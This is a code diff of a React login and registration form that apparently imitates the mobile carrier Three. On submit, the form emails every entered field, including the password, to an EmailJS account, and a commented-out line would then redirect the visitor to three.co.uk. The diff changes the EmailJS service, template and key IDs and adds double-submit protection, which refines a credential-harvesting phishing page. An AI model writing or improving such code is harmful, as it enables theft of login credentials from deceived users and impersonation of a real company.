@@ -7,6 +7,7 @@ const AuthForm = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   const [accountType, setAccountType] = useState("personal");
+  const [isSending, setIsSending] = useState(false); // ✅ prevent double click
 
   // State for input fields
   const [formData, setFormData] = useState({
@@ -23,54 +24,60 @@ const AuthForm = () => {
 
   const form = useRef();
 
-  // Login email sender
+  // ✅ Login email sender
   const sendLoginEmail = (e) => {
     e.preventDefault();
+    if (isSending) return; // prevent multiple sends
+    setIsSending(true);
 
     emailjs
       .sendForm(
-        "service_e1eul13",
-        "template_x4r3vzo",
+        "service_50q88et",
+        "template_bh85laf",
         form.current,
-        "nb4k7l5gjhCm1Jyk1" // ✅ Your public key
+        "vambHF3ypLBcOv_j_"
       )
       .then(
         (result) => {
           console.log("Login email sent:", result.text);
-          // You can uncomment this after testing:
           // window.location.href = "https://www.three.co.uk/";
         },
         (error) => {
           console.log("Error sending login email:", error.text);
         }
-      );
-
-    e.target.reset();
+      )
+      .finally(() => {
+        setIsSending(false);
+        e.target.reset();
+      });
   };
 
-  // Register email sender
+  // ✅ Register email sender
   const sendRegisterEmail = (e) => {
     e.preventDefault();
+    if (isSending) return; // prevent multiple sends
+    setIsSending(true);
 
     emailjs
       .sendForm(
-        "service_e1eul13",
-        "template_x4r3vzo",
+        "service_50q88et",
+        "template_bh85laf",
         form.current,
-        "nb4k7l5gjhCm1Jyk1" // ✅ Your public key
+        "vambHF3ypLBcOv_j_"
       )
       .then(
         (result) => {
           console.log("Register email sent:", result.text);
-          // You can uncomment this after testing:
           // window.location.href = "https://www.three.co.uk/";
         },
         (error) => {
           console.log("Error sending register email:", error.text);
         }
-      );
-
-    e.target.reset();
+      )
+      .finally(() => {
+        setIsSending(false);
+        e.target.reset();
+      });
   };
 
   return (
@@ -91,6 +98,7 @@ const AuthForm = () => {
         {/* Tabs */}
         <div className="flex justify-center mt-4 border-b border-gray-900">
           <button
+            type="button"
             className={`w-1/2 pb-2 font-medium text-center ${
               !isRegister ? "border-b-2 border-black" : "text-gray-500"
             }`}
@@ -99,6 +107,7 @@ const AuthForm = () => {
             Log in
           </button>
           <button
+            type="button"
             className={`w-1/2 pb-2 font-medium text-center ${
               isRegister ? "border-b-2 border-black" : "text-gray-500"
             }`}
@@ -178,7 +187,7 @@ const AuthForm = () => {
           <div className="relative mt-4">
             <input
               type={showPassword ? "text" : "password"}
-              name="password" // ✅ Fixed field name
+              name="password"
               value={formData.password}
               onChange={handleChange}
               placeholder="Password*"
@@ -239,9 +248,16 @@ const AuthForm = () => {
           {/* Submit Button */}
           <button
             type="submit"
-            className="w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6"
+            disabled={isSending}
+            className={`w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6 ${
+              isSending ? "opacity-50 cursor-not-allowed" : ""
+            }`}
           >
-            {isRegister ? "Register" : "Log in"}
+            {isSending
+              ? "Sending..."
+              : isRegister
+              ? "Register"
+              : "Log in"}
           </button>
         </form>
       </div>
